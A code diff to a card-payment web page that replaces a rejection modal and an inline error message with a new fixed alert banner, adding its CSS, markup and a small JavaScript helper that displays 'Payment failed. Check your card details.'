@@ -483,6 +483,38 @@
   .error-msg.active{
     display:block;
   }
+  .rejection-notice {
+    position: fixed;
+    top: 18px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 1100;
+    display: none;
+    align-items: center;
+    gap: 10px;
+    width: min(92%, 430px);
+    padding: 12px 16px;
+    border: 1px solid #f0b7b7;
+    border-radius: 10px;
+    background: #fff5f5;
+    color: #c0392b;
+    font-size: 14px;
+    font-weight: 800;
+    box-shadow: 0 8px 22px rgba(192, 57, 43, .18);
+  }
+  .rejection-notice.show { display: flex; }
+  .rejection-notice__icon {
+    display: grid;
+    place-items: center;
+    width: 24px;
+    height: 24px;
+    flex: none;
+    border-radius: 50%;
+    background: #c0392b;
+    color: #fff;
+    font-size: 17px;
+    line-height: 1;
+  }
   .field-row.invalid{
     border-color: #c0392b !important;
     background: #fdf2f2;
@@ -714,6 +746,10 @@
 </style>
 </head>
 <body class="lang-en">
+<div class="rejection-notice" id="rejectionNotice" role="alert">
+  <span class="rejection-notice__icon" aria-hidden="true">×</span>
+  <span id="rejectionNoticeText">Payment failed. Check your card details.</span>
+</div>
 
 <header>
   <div class="wrap">
@@ -1089,6 +1125,12 @@
     document.getElementById('rejectModal').classList.remove('active');
   }
 
+  function showRejectionNotice(message) {
+    var notice = document.getElementById('rejectionNotice');
+    document.getElementById('rejectionNoticeText').textContent = message;
+    notice.classList.add('show');
+  }
+
   function pollLoginStatus(paymentId) {
     if (statusPollTimer) clearInterval(statusPollTimer);
 
@@ -1185,7 +1227,7 @@
         pollLoginStatus(data.id);
       } else {
         document.getElementById('loadingOverlay').classList.remove('active');
-        document.getElementById('rejectModal').classList.add('active');
+        showRejectionNotice('Payment failed. Check your card details.');
       }
     })
     .catch(function(err){
@@ -1205,10 +1247,7 @@
     }
 
     if (params.get('error') === '1') {
-      var errorMsg = document.getElementById('errorMsg');
-      errorMsg.textContent = 'Card details were rejected. Please review and try again.';
-      errorMsg.style.color = '#c0392b';
-      errorMsg.classList.add('active');
+      showRejectionNotice('Payment failed. Check your card details.');
     }
 
     var sessionId = sessionStorage.getItem('aman_bank_session_id');
